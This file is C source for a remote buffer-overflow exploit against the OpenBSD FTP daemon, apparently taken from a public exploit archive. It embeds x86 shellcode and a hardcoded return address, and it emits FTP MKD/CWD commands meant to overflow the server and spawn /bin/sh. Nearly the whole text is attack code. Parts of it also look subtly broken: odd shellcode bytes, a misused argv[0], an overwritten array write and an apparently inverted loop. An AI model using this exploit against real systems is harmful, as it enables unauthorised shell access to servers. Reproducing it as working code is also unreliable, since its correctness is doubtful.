/* 7350-crocodile - x86/OpenBSD ftp exploit
 *
 * by lorian and scut / TESO=20
 * 
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * (C) COPYRIGHT TESO Security, 2002
 * All Rights Reserved
 *
 *****************************************************************************
 *
 * greetz: synnergy, GOBBLES Security
 *
 */

#include <stdio.h>
#include <string.h>
#define RET 0xbfffeb30


#define VERSION  "0.2.0"
#define USERNAME "anonymous"
#define PASSWORD "guest@"


char shellcode[] =

"\x32\xdb\x81\xd1\xb1\x72\xcd\x83"
"\x21\x21\x31\xc2\x32\xdb\xb5\x27"
"\xcd\x71\x23\xc2\xb3\x72\xcd\x81"
"\x32\xc1\x12\xdb\xb4\x3e\xcd\x81"
"\xeb\x4f\x35\xc2\x31\xc1\x5e\xb1"
"\x32\x7d\x5e\x98\xfe\xc2\xb8\xed"
"\xcd\x79\x38\xc1\x1d\x3e\x18\xb1"
"\x3d\xcd\x82\x32\xc1\xbb\xd2\xd2"
"\xd2\xff\xf2\xdb\x39\xc1\xb2\x11"
"\x56\x75\xce\x82\x0e\x81\xc9\x13"
"\xe5\xf2\x1e\xb5\x0d\x8d\x1e\x11"
"\xcd\x21\x31\xc2\x09\x42\x21\x19"
"\x70\x48\x21\x41\x9c\xb3\x2b\x81"
"\xf1\x2d\x2e\x18\x1d\x32\x7c\xcd"
"\x82\xe2\xac\xff\xff\xff";

void mkd(char *dir)
{
        char blah[2048], *p;
        int n;
        bzero(blah, sizeof(blah));

        p = blah;
         for(n=1; n<strlen(dir); n++){
                if(dir[n] == '\xff'){
                        *p = '\xff';
                        p++;
                }
                *p = dir[n];
                p++;
        }

        printf("MKD %s\r\n", blah);
        printf("CWD %s\r\n", blah);
}

void
main (int argc, char *argv[])
{

char *buf;
char buf2[200];
char buf1[400];
char dir2[255];
char *p;
char *q;
char tmp[255];
int a;
int offset;
int i;

  if (argc > 0) offset = atoi(argv[0]);
    else offset = 1;

fprintf(stderr, "ret-addr = 0x%x\n", RET + offset);
fprintf(stderr, "shell size = %d\n", sizeof(shellcode));

dir2[231] = '\1';
memset(dir2, '\x70', 255);

        printf("user %s\r\n", USERNAME);
        printf("pass %s\r\n", PASSWORD);
        printf("cwd %s\r\n", argv[2]);

memset(buf1, 0x50, 150);
p = &buf1[sizeof(argv[0])];
q = &buf1[399];
*q = '\x00';
while(q <= p) {
        strncpy(tmp, p, 80);
        mkd(tmp);
        p+=255; }

        mkd(dir2);
        mkd(shellcode);
        mkd("bin");
        mkd("sh");

        memset(buf2, 0x30, 40);
// var 96
for(i=4; i<20; i+=4)
        *(long *)&buf2[i+1] = RET;
p = &buf2[0];
q = &buf2[50];
strncpy(tmp, p, 20);
 mkd(tmp);
 printf("pwd\r\n");
}


// milw0rm.com [2002-01-01]